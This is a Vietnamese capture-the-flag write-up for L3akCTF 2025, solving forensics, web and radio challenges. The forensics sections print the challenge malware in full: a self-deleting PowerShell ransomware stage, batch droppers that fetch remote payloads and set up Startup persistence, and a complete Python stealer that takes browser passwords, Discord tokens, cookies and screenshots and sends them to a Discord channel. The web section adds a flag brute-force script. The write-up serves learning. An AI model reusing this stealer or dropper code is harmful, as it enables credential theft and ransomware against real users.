---
title: "[Write-up] L3akCTF 2025"
published: 2025-07-14
tags: [CTF, L3akCTF]
category: Write-up
description: Thật vui khi ghi được điểm trong cuộc thii
draft: false
image: /assets/data/L3ak_CTF_2025_Logo.png
---

# Forensics

## Ghost In The Dark
> A removable drive was recovered from a compromised system. Files appear encrypted, and a strange ransom note is all that remains.
>The payload? Gone.
>The key? Vanished.
>But traces linger in the shadows. Recover what was lost.
>Password to open zip - L3akCTF

Dùng bộ công cụ ```sleuth kit``` liệt kê tất cả các file ở phân vùng ```128```
```
fls -o 128 -r GhostInTheDark.001
r/r 4-128-1:    $AttrDef
r/r 8-128-2:    $BadClus
r/r 8-128-1:    $BadClus:$Bad
r/r 6-128-4:    $Bitmap
r/r 7-128-1:    $Boot
d/d 11-144-4:   $Extend
+ d/d 29-144-2: $Deleted
+ r/r 25-144-2: $ObjId:$O
+ r/r 24-144-3: $Quota:$O
+ r/r 24-144-2: $Quota:$Q
+ r/r 26-144-2: $Reparse:$R
+ d/d 27-144-2: $RmMetadata
++ r/r 28-128-4:        $Repair
++ r/r 28-128-2:        $Repair:$Config
++ r/r 28-128-6:        $Repair:$Corrupt
++ r/r 28-128-8:        $Repair:$Verify
++ d/d 31-144-2:        $Txf
++ d/d 30-144-2:        $TxfLog
+++ r/r 32-128-2:       $Tops
+++ r/r 32-128-4:       $Tops:$T
+++ r/r 33-128-1:       $TxfLog.blf
+++ r/r 34-128-1:       $TxfLogContainer00000000000000000001
+++ r/r 35-128-1:       $TxfLogContainer00000000000000000002
r/r 2-128-1:    $LogFile
r/r 0-128-6:    $MFT
r/r 1-128-1:    $MFTMirr
r/r 9-128-8:    $Secure:$SDS
r/r 9-144-11:   $Secure:$SDH
r/r 9-144-5:    $Secure:$SII
r/r 10-128-1:   $UpCase
r/r 10-128-4:   $UpCase:$Info
r/r 3-128-3:    $Volume
r/r 42-128-1:   flag.enc
r/r 41-128-3:   payload.enc
r/r 38-128-1:   ransom_note.txt
r/r 43-128-3:   RIP_PuppyJaws.enc
d/d 36-144-1:   System Volume Information
+ r/r 37-128-1: WPSettings.dat
r/r 39-128-1:   trip_itinerary.enc
-/r * 40-128-1: loader.ps1
V/V 256:        $OrphanFiles
```
Ta sẽ có 4 file ```flag.enc``` ```payload.enc``` ```loader.ps1``` và ```ransom_note.txt```

1. ***loader.ps1***

```
$key = [System.Text.Encoding]::UTF8.GetBytes("0123456789abcdef")
$iv  = [System.Text.Encoding]::UTF8.GetBytes("abcdef9876543210")

$AES = New-Object System.Security.Cryptography.AesManaged
$AES.Key = $key
$AES.IV = $iv
$AES.Mode = "CBC"
$AES.Padding = "PKCS7"

$enc = Get-Content "L:\payload.enc" -Raw
$bytes = [System.Convert]::FromBase64String($enc)
$decryptor = $AES.CreateDecryptor()
$plaintext = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
$script = [System.Text.Encoding]::UTF8.GetString($plaintext)

Invoke-Expression $script

# Self-delete
Remove-Item $MyInvocation.MyCommand.Path
```
Đây là một ```powershell``` mã hóa nội dung của ```payload.enc``` bằng ```AES-CBC``` viết 1 đoạn ```python``` giải mã

```python
from Crypto.Cipher import AES
import base64

key = b"0123456789abcdef"
iv = b"abcdef9876543210"

with open("payload.enc", "rb") as f:
    enc_data = base64.b64decode(f.read())

cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = cipher.decrypt(enc_data)
# Remove PKCS7 padding:
pad_len = plaintext[-1]
plaintext = plaintext[:-pad_len]

with open("payload_decoded.ps1", "wb") as f:
    f.write(plaintext)

```
2. ***payload.enc***

Giải mã ta được

```
$key = [System.Text.Encoding]::UTF8.GetBytes("m4yb3w3d0nt3x1st")
$iv  = [System.Text.Encoding]::UTF8.GetBytes("l1f31sf0rl1v1ng!")

$AES = New-Object System.Security.Cryptography.AesManaged
$AES.Key = $key
$AES.IV = $iv
$AES.Mode = "CBC"
$AES.Padding = "PKCS7"

# Load plaintext flag from C:\ (never written to L:\ in plaintext)
$flag = Get-Content "C:\Users\Blue\Desktop\StageRansomware\flag.txt" -Raw
$encryptor = $AES.CreateEncryptor()
$bytes = [System.Text.Encoding]::UTF8.GetBytes($flag)
$cipher = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
[System.IO.File]::WriteAllBytes("L:\flag.enc", $cipher)

# Encrypt other files staged in D:\ (or L:\ if you're using L:\ now)
$files = Get-ChildItem "L:\" -File | Where-Object {
    $_.Name -notin @("ransom.ps1", "ransom_note.txt", "flag.enc", "payload.enc", "loader.ps1")
}

foreach ($file in $files) {
    $plaintext = Get-Content $file.FullName -Raw
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($plaintext)
    $cipher = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    [System.IO.File]::WriteAllBytes("L:\$($file.BaseName).enc", $cipher)
    Remove-Item $file.FullName
}

# Write ransom note
$ransomNote = @"
i didn't mean to encrypt them.
i was just trying to remember.

the key? maybe it's still somewhere in the dark.
the script? it was scared, so it disappeared too.

maybe you'll find me.
maybe you'll find yourself.

- vivi (or his ghost)
"@
Set-Content "L:\ransom_note.txt" $ransomNote -Encoding UTF8

# Self-delete
Remove-Item $MyInvocation.MyCommand.Path
```
```powershell``` này cũng mã hóa nội dung của ```flag.enc``` bằng ```AES-CBC``` viết 1 đoạn ```python``` giải mã

```python
from Crypto.Cipher import AES

key = b"m4yb3w3d0nt3x1st"
iv = b"l1f31sf0rl1v1ng!"

with open("flag.enc", "rb") as f:
    cipher = f.read()

aes = AES.new(key, AES.MODE_CBC, iv)
plaintext = aes.decrypt(cipher)

# Remove PKCS7 padding
pad_len = plaintext[-1]
plaintext = plaintext[:-pad_len]

print(plaintext.decode('utf-8'))

```
```
flag: L3AK{d3let3d_but_n0t_f0rg0tt3n}
```



## BOMbardino crocodile
>APT Lobster has successfully breached a machine in our network, marking their first confirmed intrusion. Fortunately, the DFIR team acted quickly, isolating the compromised system and collecting several suspicious files for analysis. Among the evidence, they also recovered an outbound email sent by the attacker just before containment, I wonder who was he communicating with...The flag consists of 2 parts.

Chúng tôi được cung cấp một tệp email và ảnh chụp nhanh ổ đĩa C. Email chứa liên kết mời đến ```LobsterLeaks```máy chủ, nơi thu thập tất cả dữ liệu đã thu thập được từ kẻ đánh cắp thông tin

![image](/assets/data/l3akctf-4.png)

Sau khi tham gia máy chủ tôi nhận được một tệp mã hóa ```pay2winflag.jpg.enc``` và tệp ```passwords.zip``` nhưng trống
![image](/assets/data/l3akctf-5.png)

Đối với ổ địa C thư mục download của crustacean chứa một số tệp thú vị

![image](/assets/data/l3akctf-6.png)


```lil-l3ak-exam.pdf``` chứa một đường dẫn tải xuống tệp ```Lil L3ak secret plans for tonight.bat```, giờ chúng ta cùng phân tích tệp này

1. ***Lil L3ak secret plans for tonight.bat***

Nếu chũng ta mở tệp bằng trình soạn thảo ```hex``` ta thấy tệp bị mã hóa dưới dạng ký tự tiếng Trung do có ```FF FE``` Dấu thứ tự byte (BOM) ở đầu tệp. Điều này khiến trình soạn thảo văn bản hiểu tệp là UTF-16LEtệp đã được mã hóa

![image](/assets/data/l3akctf-7.png)

Sau khi loại bỏ BOM và ```echo``` các lệnh không sử dụng, chúng ta sẽ có một tập lệnh giai đoạn đầu có thể đọc được. Tập lệnh này sẽ tải xuống một tệp giai đoạn hai được lưu trữ trên GitHub (hiện không thể truy cập được), vì vậy chúng ta cần tìm tệp batch đã tải xuống trong thư mục Temp

```
start /min cmd /c "powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri 'https://github.com/bluecrustacean/oceanman/raw/main/t1-l3ak.bat' -OutFile '%TEMP%\temp.bat'; Start-Process -FilePath '%TEMP%\temp.bat' -WindowStyle Hidden"
```

2. ***temp.bat***

Tệp ```temp.bat``` cũng được làm tối nghĩa tương tự bằng kỹ thuật BOM. Sau khi dọn dẹp, chúng ta sẽ có được tập lệnh giai đoạn hai

```
start /min powershell.exe -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://github.com/bluecrustacean/oceanman/raw/main/ud.bat', '%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsSecure.bat'); (New-Object -TypeName System.Net.WebClient).DownloadFile('https://www.dropbox.com/scl/fi/uuhwziczwa79d6r8erdid/T602.zip?rlkey=fq4lptuz5tvw2qjydfwj9k0ym&st=mtz77hlx&dl=1', 'C:\\Users\\Public\\Document.zip'); Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('C:/Users/Public/Document.zip', 'C:/Users/Public/Document'); Start-Sleep -Seconds 60; C:\\Users\\Public\\Document\\python.exe C:\Users\Public\Document\Lib\leak.py; Remove-Item 'C:/Users/Public/Document.zip' -Force" && exit
```
Tóm lại ```powershell``` làm các công việc sau:

Thiết lập persistence: .bat nằm trong thư mục Startup → mã độc sẽ chạy mỗi khi Windows khởi động.

Tải payload từ xa: .zip tải từ Dropbox → tránh phát hiện sớm.

Chạy mã độc Python: thông qua ```leak.py``` – tên gợi ý nó có thể "leak" (rò rỉ) dữ liệu.

Ẩn mình: Chạy PowerShell ẩn, tự xóa .zip, không hiện cửa sổ → khó bị người dùng phát hiện.

3. ***leak.py***

```
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'=kSKnoFWoxWW5d2bYl3avlVajlDUWZETjdkTwZVMs9mUyoUYiRkThRWbodlWYlUNWFDZ3RFbkBVVXJ1RXtmVPJVMKR1Vsp1Vj1mUZRFbOFmYGRGMW1GeoJVMadlVYxmbSJjThN2RxMFVF9WeZRlTr1UMSllUtBHWZVlSxV1aW9UTWplcX1WNYRmM0VUWxI0UhFjShVlaKdlTHdGeWxGbHZ1a180VrpFakBjWzZ1a5cUTWJ1VXxmVPd1RSJnVxgWYiVUMM90VxUlVYJkVWJjRwImVONjWHhXaRJjU1Z1Mj<snipped>'))
```

Nó bị mã hóa ```base64``` lồng nhau. Tôi đã sử dụng công thức CyberChef tuyệt vời này để giải mã tập lệnh


```
Label('top')
Regular_expression('User defined','[a-zA-Z0-9+/=]{30,}',true,true,false,false,false,false,'List matches')
Reverse('Character')
From_Base64('A-Za-z0-9+/=',true,false)
Conditional_Jump('psutil',true,'top',100)
```
![image](/assets/data/l3akctf-8.png)

```python
import psutil
import platform
import json
from datetime import datetime
from time import sleep
import requests
import socket
from requests import get
import os
import re
import subprocess
from uuid import getnode as get_mac
import browser_cookie3 as steal, requests, base64, random, string, zipfile, shutil, os, re, sys, sqlite3
from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.backends import default_backend
from Crypto.Cipher import AES
from base64 import b64decode, b64encode
from subprocess import Popen, PIPE
from json import loads, dumps
from shutil import copyfile
from sys import argv
import discord
from discord.ext import commands
from io import BytesIO

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

def scale(bytes, suffix="B"):
    defined = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < defined:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= defined

uname = platform.uname()
bt = datetime.fromtimestamp(psutil.boot_time())
host = socket.gethostname()
localip = socket.gethostbyname(host)

publicip = get(f'https://ipinfo.io/ip').text
city = get(f'https://ipinfo.io/{publicip}/city').text
region = get(f'https://ipinfo.io/{publicip}/region').text
postal = get(f'https://ipinfo.io/{publicip}/postal').text
timezone = get(f'https://ipinfo.io/{publicip}/timezone').text
currency = get(f'https://ipinfo.io/{publicip}/currency').text
country = get(f'https://ipinfo.io/{publicip}/country').text
loc = get(f"https://ipinfo.io/{publicip}/loc").text
vpn = requests.get('http://ip-api.com/json?fields=proxy')
proxy = vpn.json()['proxy']
mac = get_mac()

roaming = os.getenv('AppData')
output = open(roaming + "temp.txt", "a")

Directories = {
        'Discord': roaming + '\\Discord',
        'Discord Two': roaming + '\\discord',
        'Discord Canary': roaming + '\\Discordcanary',
        'Discord Canary Two': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': roaming + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': roaming + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': roaming + '\\Yandex\\YandexBrowser\\User Data\\Default',
}

def Yoink(Directory):
    Directory += '\\Local Storage\\leveldb'
    Tokens = []

    for FileName in os.listdir(Directory):
        if not FileName.endswith('.log') and not FileName.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{Directory}\\{FileName}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for Token in re.findall(regex, line):
                    Tokens.append(Token)

    return Tokens

def Wipe():
    if os.path.exists(roaming + "temp.txt"):
      output2 = open(roaming + "temp.txt", "w")
      output2.write("")
      output2.close()
    else:
      pass

realshit = ""
for Discord, Directory in Directories.items():
    if os.path.exists(Directory):
        Tokens = Yoink(Directory)
        if len(Tokens) > 0:
            for Token in Tokens:
                realshit += f"{Token}\n"

cpufreq = psutil.cpu_freq()
svmem = psutil.virtual_memory()
partitions = psutil.disk_partitions()
disk_io = psutil.disk_io_counters()
net_io = psutil.net_io_counters()

partitions = psutil.disk_partitions()
partition_usage = None
for partition in partitions:
    try:
        partition_usage = psutil.disk_usage(partition.mountpoint)
        break
    except PermissionError:
        continue

system_info = {
    "embeds": [
        {
            "title": f"Hah Gottem! - {host}",
            "color": 8781568
        },
        {
            "color": 7506394,
            "fields": [
                {
                    "name": "GeoLocation",
                    "value": f"Using VPN?: {proxy}\nLocal IP: {localip}\nPublic IP: {publicip}\nMAC Adress: {mac}\n\nCountry: {country} | {loc} | {timezone}\nregion: {region}\nCity: {city} | {postal}\nCurrency: {currency}\n\n\n\n"
                }
            ]
        },
        {
            "fields": [
                {
                    "name": "System Information",
                    "value": f"System: {uname.system}\nNode: {uname.node}\nMachine: {uname.machine}\nProcessor: {uname.processor}\n\nBoot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}"
                }
            ]
        },
        {
            "color": 15109662,
            "fields": [
                {
                    "name": "CPU Information",
                    "value": f"Psychical cores: {psutil.cpu_count(logical=False)}\nTotal Cores: {psutil.cpu_count(logical=True)}\n\nMax Frequency: {cpufreq.max:.2f}Mhz\nMin Frequency: {cpufreq.min:.2f}Mhz\n\nTotal CPU usage: {psutil.cpu_percent()}\n"
                },
                {
                    "name": "Memory Information",
                    "value": f"Total: {scale(svmem.total)}\nAvailable: {scale(svmem.available)}\nUsed: {scale(svmem.used)}\nPercentage: {svmem.percent}%"
                },
                {
                    "name": "Disk Information",
                    "value": f"Total Size: {scale(partition_usage.total)}\nUsed: {scale(partition_usage.used)}\nFree: {scale(partition_usage.free)}\nPercentage: {partition_usage.percent}%\n\nTotal read: {scale(disk_io.read_bytes)}\nTotal write: {scale(disk_io.write_bytes)}"
                },
                {
                    "name": "Network Information",
                    "value": f"Total Sent: {scale(net_io.bytes_sent)}\nTotal Received: {scale(net_io.bytes_recv)}"
                }
            ]
        },
        {
            "color": 7440378,
            "fields": [
                {
                    "name": "Discord information",
                    "value": f"Token: {realshit}"
                }
            ]
        }
    ]
}

DBP = r'Google\Chrome\User Data\Default\Login Data'
ADP = os.environ['LOCALAPPDATA']

def sniff(path):
    path += '\\Local Storage\\leveldb'

    tokens = []
    try:
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
        return tokens
    except:
        pass


def encrypt(cipher, plaintext, nonce):
    cipher.mode = modes.GCM(nonce)
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext)
    return (cipher, ciphertext, nonce)


def decrypt(cipher, ciphertext, nonce):
    cipher.mode = modes.GCM(nonce)
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext)


def rcipher(key):
    cipher = Cipher(algorithms.AES(key), None, backend=default_backend())
    return cipher


def dpapi(encrypted):
    import ctypes
    import ctypes.wintypes

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD),
                    ('pbData', ctypes.POINTER(ctypes.c_char))]

    p = ctypes.create_string_buffer(encrypted, len(encrypted))
    blobin = DATA_BLOB(ctypes.sizeof(p), p)
    blobout = DATA_BLOB()
    retval = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
    if not retval:
        raise ctypes.WinError()
    result = ctypes.string_at(blobout.pbData, blobout.cbData)
    ctypes.windll.kernel32.LocalFree(blobout.pbData)
    return result


def localdata():
    jsn = None
    with open(os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State"), encoding='utf-8', mode="r") as f:
        jsn = json.loads(str(f.readline()))
    return jsn["os_crypt"]["encrypted_key"]


def decryptions(encrypted_txt):
    encoded_key = localdata()
    encrypted_key = base64.b64decode(encoded_key.encode())
    encrypted_key = encrypted_key[5:]
    key = dpapi(encrypted_key)
    nonce = encrypted_txt[3:15]
    cipher = rcipher(key)
    return decrypt(cipher, encrypted_txt[15:], nonce)


class chrome:
    def __init__(self):
        self.passwordList = []

    def chromedb(self):
        _full_path = os.path.join(ADP, DBP)
        _temp_path = os.path.join(ADP, 'sqlite_file')
        if os.path.exists(_temp_path):
            os.remove(_temp_path)
        shutil.copyfile(_full_path, _temp_path)
        self.pwsd(_temp_path)
        
    def pwsd(self, db_file):
        conn = sqlite3.connect(db_file)
        _sql = 'select signon_realm,username_value,password_value from logins'
        for row in conn.execute(_sql):
            host = row[0]
            if host.startswith('android'):
                continue
            name = row[1]
            value = self.cdecrypt(row[2])
            _info = '[==================]\nhostname => : %s\nlogin => : %s\nvalue => : %s\n[==================]\n\n' % (host, name, value)
            self.passwordList.append(_info)
        conn.close()
        os.remove(db_file)

    def cdecrypt(self, encrypted_txt):
        if sys.platform == 'win32':
            try:
                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                    decrypted_txt = dpapi(encrypted_txt)
                    return decrypted_txt.decode()
                elif encrypted_txt[:3] == b'v10':
                    decrypted_txt = decryptions(encrypted_txt)
                    return decrypted_txt[:-16].decode()
            except WindowsError:
                return None
        else:
            pass

    def saved(self):
        try:
            with open(r'C:\ProgramData\passwords.txt', 'w', encoding='utf-8') as f:
                f.writelines(self.passwordList)
        except WindowsError:
            return None

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')
    
    channel = bot.get_channel(CHANNEL_ID)
    if not channel:
        print(f"Could not find channel with ID: {CHANNEL_ID}")
        return
    
    main = chrome()
    try:
        main.chromedb()
    except Exception as e:
        print(f"Error getting Chrome passwords: {e}")
    main.saved()
    
    await exfiltrate_data(channel)
    
    await bot.close()

async def exfiltrate_data(channel):
    try:
        hostname = requests.get("https://ipinfo.io/ip").text
    except:
        hostname = "Unknown"
    
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '\n'
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += '```'
        tokens = sniff(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            pass
        message += '```'

    try:
        from PIL import ImageGrab
        from Crypto.Cipher import ARC4
        screenshot = ImageGrab.grab()
        screenshot_path = os.getenv('ProgramData') + r'\pay2winflag.jpg'
        screenshot.save(screenshot_path)

        with open(screenshot_path, 'rb') as f:
            image_data = f.read()

        key = b'tralalero_tralala'
        cipher = ARC4.new(key)
        encrypted_data = cipher.encrypt(image_data)

        encrypted_path = screenshot_path + '.enc'
        with open(encrypted_path, 'wb') as f:
            f.write(encrypted_data)

        await channel.send(f"Screenshot from {hostname} (Pay $500 for the key)", file=discord.File(encrypted_path))

    except Exception as e:
        print(f"Error taking screenshot: {e}")

    try:
        zname = r'C:\ProgramData\passwords.zip'
        newzip = zipfile.ZipFile(zname, 'w')
        newzip.write(r'C:\ProgramData\passwords.txt')
        newzip.close()
        
        await channel.send(f"Passwords from {hostname}", file=discord.File(zname))
    except Exception as e:
        print(f"Error with password file: {e}")

    try:
        usr = os.getenv("UserName")
        keys = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey').decode().split('\n')[1].strip()
        types = subprocess.check_output('wmic os get Caption').decode().split('\n')[1].strip()
    except Exception as e:
        print(f"Error getting system info: {e}")
        usr = "Unknown"
        keys = "Unknown"
        types = "Unknown"

    cookie = [".ROBLOSECURITY"]
    cookies = []
    limit = 2000
    roblox = "No Roblox cookies found"

    try:
        cookies.extend(list(steal.chrome()))
    except Exception as e:
        print(f"Error stealing Chrome cookies: {e}")

    try:
        cookies.extend(list(steal.firefox()))
    except Exception as e:
        print(f"Error stealing Firefox cookies: {e}")

    try:
        for y in cookie:
            send = str([str(x) for x in cookies if y in str(x)])
            chunks = [send[i:i + limit] for i in range(0, len(send), limit)]
            for z in chunks:
                roblox = f'```{z}```'
    except Exception as e:
        print(f"Error processing cookies: {e}")

    embed = discord.Embed(title=f"Data from {hostname}", description="A victim's data was extracted, here's the details:", color=discord.Color.blue())
    embed.add_field(name="Windows Key", value=f"User: {usr}\nType: {types}\nKey: {keys}", inline=False)
    embed.add_field(name="Roblox Security", value=roblox[:1024], inline=False)
    embed.add_field(name="Tokens", value=message[:1024], inline=False)
    
    await channel.send(embed=embed)
    
    with open(r'C:\ProgramData\system_info.json', 'w', encoding='utf-8') as f:
        json.dump(system_info, f, indent=4, ensure_ascii=False)
    
    await channel.send(file=discord.File(r'C:\ProgramData\system_info.json'))

    try:
        os.remove(r'C:\ProgramData\pay2winflag.jpg')
        os.remove(r'C:\ProgramData\pay2winflag.jpg.enc')
        os.remove(r'C:\ProgramData\passwords.zip')
        os.remove(r'C:\ProgramData\passwords.txt')
        os.remove(r'C:\ProgramData\system_info.json')
    except Exception as e:
        print(f"Error cleaning up: {e}")

BOT_TOKEN = "..."
CHANNEL_ID = ...

if __name__ == "__main__":
    bot.run(BOT_TOKEN)

```
Tổng quan về ```leak.py```:

* ***Đánh cắp***: Mã thông báo Discord, mật khẩu trình duyệt đã lưu, cookie, thông tin hệ thống và ảnh chụp màn hình
* ***Lọc dữ liệu***: Gửi tất cả dữ liệu đã thu thập qua bot Discord đến kênh trên ```LobsterLeaks``` máy chủ
* ***Dọn dẹp***: Xóa bằng chứng như ảnh chụp màn hình và tệp tạm thời

4. ***Mã hóa ảnh chụp màn hình RC4 (phần thứ 2 của cờ)***

```python
try:
        from PIL import ImageGrab
        from Crypto.Cipher import ARC4
        screenshot = ImageGrab.grab()
        screenshot_path = os.getenv('ProgramData') + r'\pay2winflag.jpg'
        screenshot.save(screenshot_path)

        with open(screenshot_path, 'rb') as f:
            image_data = f.read()

        key = b'tralalero_tralala'
        cipher = ARC4.new(key)
        encrypted_data = cipher.encrypt(image_data)

        encrypted_path = screenshot_path + '.enc'
        with open(encrypted_path, 'wb') as f:
            f.write(encrypted_data)

        await channel.send(f"Screenshot from {hostname} (Pay $500 for the key)", file=discord.File(encrypted_path))
```
Ảnh chụp màn hình được mã hóa bằng RC4 với khóa ```tralalero_tralala```. Với khóa này, chúng ta có thể giải mã ```pay2winflag.jpg.enc``` tệp từ ```LobsterLeaks``` máy chủ bằng ```CyberChef``` và lấy phần thứ hai của cờ

![image](/assets/data/l3akctf-9.png)

5. ***Phần đầu tiên của flag***

Chúng ta đã bỏ qua tệp ```WindowsSecure.bat```. Như thường lệ, có BOM ở đầu tập lệnh. Sau khi loại bỏ nó, tập lệnh dường như đang bị làm tối chuỗi

![image](/assets/data/l3akctf-10.png)

Sau khi viết một tập lệnh giải mã bằng ```python``` chúng ta sẽ có phần đầu tiên của flag

```python
[...]
vars_dict = {}
for line in batch_script.splitlines():
    match = re.match(r'set (\w+)=(.*)', line.strip())
    if match:
        key, val = match.groups()
        vars_dict[key] = val


def decode_line(line):
    matches = re.findall(r'%(\w+)%', line)
    return ''.join(vars_dict.get(m, f"<{m}>") for m in matches)

print("📜 Giải mã các dòng batch:")
for line in batch_script.splitlines():
    if '%' in line:
        decoded = decode_line(line)
        print(decoded)

```
![image](/assets/data/image.png)


```
flag: L3AK{Br40d0_st34L3r_0r_br41nr0t}
```


# Web

## Flag L3ak
>What's the name of this CTF? Yk what to do 😉

Kiểm tra mã nguồn của trang web

1. ```/api/posts```– trả về các bài đăng trên blog có gắn cờ được che dấu bằng *

```javascript
app.get('/api/posts', (_, res) => {
    const publicPosts = posts.map(post => ({
        id: post.id,
        title: post.title,
        content: post.content.replace(FLAG, '*'.repeat(FLAG.length)),
        author: post.author,
        date: post.date
    }));
    
    res.json({
        posts: publicPosts,
        total: publicPosts.length
    });
});

```
2. ```/api/search``` điểm cuối dễ bị tấn công cho phép truy vấn 3 kí tự trên các trường bài đăng
```javascript
app.post('/api/search', (req, res) => {
    const { query } = req.body;
    
    if (!query || typeof query !== 'string' || query.length !== 3) {
        return res.status(400).json({ 
            error: 'Query must be 3 characters.',
        });
    }

    const matchingPosts = posts
        .filter(post => 
            post.title.includes(query) ||
            post.content.includes(query) ||
            post.author.includes(query)
        )
        .map(post => ({
            ...post,
            content: post.content.replace(FLAG, '*'.repeat(FLAG.length))
    }));

    res.json({
        results: matchingPosts,
        count: matchingPosts.length,
        query: query
    });
});
```
```javascript
const matchingPosts = posts
        .filter(post => 
            post.title.includes(query) ||
            post.content.includes(query) ||
            post.author.includes(query)
        )
        .map(post => ({
            ...post,
            content: post.content.replace(FLAG, '*'.repeat(FLAG.length))
    }));

```
Ta có thể thấy được nếu truy vẫn 3 kí tự trùng với ```blog``` có chứa flag thì các kí tự của flag sẽ bị thay thể bởi kí tự * 

Ta quan sát được bài viết thứ 3 có chưa flag ẩn

```javascript
{
        id: 3,
        title: "Not the flag?",
        content: `Well luckily the content of the flag is hidden so here it is: ${FLAG}`,
        author: "admin",
        date: "2025-05-13"
},
```
Vì đã biết được flag sẽ bắt đầu bằng ```R3AK{``` nên chúng ta có thể ```bruteforce``` lần lượt 3 kí tự cửa sổ trượt

```python
import requests
import re

url = 'http://34.134.162.213:17000/api/search'
known_flag = "L3AK{"
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!@#$%^&*()-=+[]{}|;:',.<>/?~\"\\"
max_len = 100

def has_masked_flag(fragment):
    try:
        res = requests.post(url, json={'query': fragment})
        data = res.json()
        for post in data.get("results", []):
            if post["id"] == 3:
                content = post.get("content", "")
                match = re.search(r":\s*([\*]{5,})\s*$", content)
                if match:
                    return True
    except Exception as e:
        print(f"[ERROR] Request failed: {e}")
    return False

def brute_force_flag():
    global known_flag
    print(f"[+] Starting with known prefix: {known_flag}")

    while len(known_flag) < max_len:
        found = False
        for c in charset:
            fragment = known_flag[-2:] + c
            if has_masked_flag(fragment):
                known_flag += c
                print(f"[+] Found next char: {c} → {known_flag}")
                found = True
                if c == '}':
                    print(f"[🏁] Found full flag: {known_flag}")
                    return
                break
        if not found:
            print("[!] Không tìm thấy ký tự tiếp theo. Dừng.")
            return

brute_force_flag()

```


```
flag: L3AK{L3ak1ng_th3_Fl4g??}
```

## NotoriousNote
>Casual coding vibes...until the notes start acting weird.

# Hardware-RF

## Strange Transmission
>I received this strange transmission and I'm not sure what to make of it! Weird beeps, static noise, then silence. Can you help me figure out what it all means?

Âm thanh này là mã morse dùng [Giải mã âm thanh Morse tại đây](https://morsecode.world/international/decoder/audio-decoder-adaptive.html) được phần đầu của flag

```
L3AKOPENBRACKETWELC0M3UNDERSCORET0UNDERSCORETH3UNDERSCOREH4RDW4R3UNDERSCORERFUNDERSCORE
```
```
L3AK{WELLC0M3_T0_TH3_H4RDW4R3_RF_
```
Mở ```audacity``` ở chế độ ```spectrogram``` sẽ được phần 2 của flag

![image](/assets/data/l3akctf-1.png)

```
flag: L3AK{WELLC0M3_T0_TH3_H4RDW4R3_RF_c4teg0ry_w3_h0p3_you_h4ve_fun!}
```

## Beneath the Surface
>On the surface, this signal is nothing but meaningless noise — a mere whisper of the wind. But dive deeper into this transmission, and a storm begins to take shape, with gray skies gathering on the horizon. Can you navigate through the static and uncover what lurks beneath the surface of the wav — before it’s too late?

Dùng ```exiftool``` xem thông tin của file thì biết đây là 1 file âm thanh WEFAX (Weather Fax) là một phương pháp cũ dùng sóng radio để truyền ảnh thời tiết (như bản đồ áp suất, radar…) dưới dạng tín hiệu FSK/AFSK analog (Khá giống SSTV)

```
Software                        : fldigi-4.2.07 (libsndfile-1.0.28)
Comment                         : WEFAX576 freq=14011.900
```
Chúng ta cũng có thể thấy gợi ý là dùng ```fldigi``` để giải mã dạng ```WEFAX576``` ở mưc tần số ```14011.900```

```
Op Mode → WEFAX → WEFAX-576 
File → Audio → Playback 
```
![image](/assets/data/l3akctf-2.png)

```
flag: L3AK{R4diOF4X_1S_G00d_4_ImAG3_Tr4nsM1sSiON}
```
# Hash Cracking

## Rule Breaker 1
